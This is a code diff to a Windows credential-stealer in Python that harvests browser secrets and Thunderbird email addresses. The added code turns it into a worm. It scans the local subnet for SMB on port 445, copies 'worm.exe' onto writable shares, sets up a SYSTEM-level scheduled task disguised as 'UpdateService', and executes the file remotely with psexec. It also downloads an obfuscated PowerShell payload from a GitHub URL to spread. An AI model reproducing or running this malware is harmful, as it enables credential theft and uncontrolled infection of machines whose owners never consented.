@@ -6,12 +6,16 @@ import winreg
 import time
 import base64
 import getpass
-import requests, win32cred, win32com.client
+import requests, win32cred, win32com.client, socket, subprocess
 from win32.win32crypt import CryptUnprotectData
 from Crypto.Cipher.AES import new, MODE_GCM
+from smb.SMBConnection import SMBConnection
+from email.mime.application import MIMEApplication 
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
-from email import encoders 
+from email.mime.text import MIMEText
+from email import encoders
+import ssl
 import urllib.parse
 from chardet import detect
 import plyvel
@@ -32,6 +36,46 @@ thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
 local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
 os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM brave.exe /IM opera.exe >nul 2>&1")
+
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+def s_n():
+    base_ad = ".".join(get_local_ip().split('.')[:-1])
+    act_host = []
+    for i in range(1,255):
+        target = f"{base_ad}.{i}"
+        try:
+            socket.setdefaulttimeout(1.0)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, 445))
+            act_host.append(target)
+            s.close()
+        except Exception as e:
+            print(f"ERROR CONNECTING TO {target} : {e}")
+    return act_host
+
+def infect_host(host, file_path):
+    try:
+        conn = SMBConnection("", "", socket.gethostname(), host, use_ntlm_v2=False)
+        conn.connect(host, 445)
+        # Hunt writable shares
+        shares = conn.listShares()
+        for share in shares:
+            if not share.isSpecial and share.name not in ['IPC$', 'PRINT$']:
+                try:
+                    conn.storeFile(share.name, "worm.exe", open(file_path, 'rb'))
+                    # Optional: Add persistence via scheduled task
+                    subprocess.call(f"schtasks /create /s {host} /tn 'UpdateService' /tr '{share.name}\\worm.exe' /sc onstart /ru SYSTEM /rl HIGHEST /f", shell=True)
+                    subprocess.Popen(f'psexec \\\\{host} -s -d cmd /c "{share.name}\\worm.exe"', shell=True)
+                except:
+                    continue
+    except:
+        pass
 
 def decode_with_fallback(data):
     for encoding in ['utf-8', 'utf-16-le', 'latin1']:
@@ -380,6 +424,16 @@ def thunderbird(thunderbird_path, email_pattern):
                 except: pass
             conn.close()
     return emails
+
+def just_try_smb():
+    t_path = os.path.join(os.getenv('TEMP'), "random.ps1")
+    link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_initializer.ps1"
+    c = requests.get(link)
+    if c.status_code == 200:
+        open(t_path, 'wb').write(c.content)
+    for host in s_n():
+        infect_host(host, t_path)
+
 
 emails = []
 
